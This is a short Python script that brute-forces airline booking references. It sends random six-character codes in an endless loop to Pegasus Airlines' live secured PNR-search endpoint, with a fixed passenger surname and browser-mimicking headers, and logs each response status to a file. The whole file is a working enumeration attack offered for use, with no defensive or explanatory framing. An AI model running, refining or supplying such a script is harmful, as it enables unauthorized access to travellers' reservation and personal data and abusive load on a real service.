import aiohttp
import asyncio
import random
import string

async def make_request(session, file):
    pnr_no = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    url = 'https://web.flypgs.com/pegasus/pnr-search/filtered/secured'
    payload = {"pnrNo": pnr_no, "surname": "ASLANBAŞ", "deleteOptionalSsr": True, "filter": "MMB"}
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/json",
        "X-Platform": "web",
        "Cache-Control": "no-cache, no-store, must-revalidate"
    }
    async with session.post(url, json=payload, headers=headers) as response:
        print(f"{pnr_no} - {response.status}")
        file.write(f"{pnr_no} - {response.status}\n")
        if response.status == 403:
            await session.close()

async def main():
    async with aiohttp.ClientSession() as session:
        with open('status_codes.txt', 'w') as file:
            while True:
                await make_request(session, file)

asyncio.run(main())
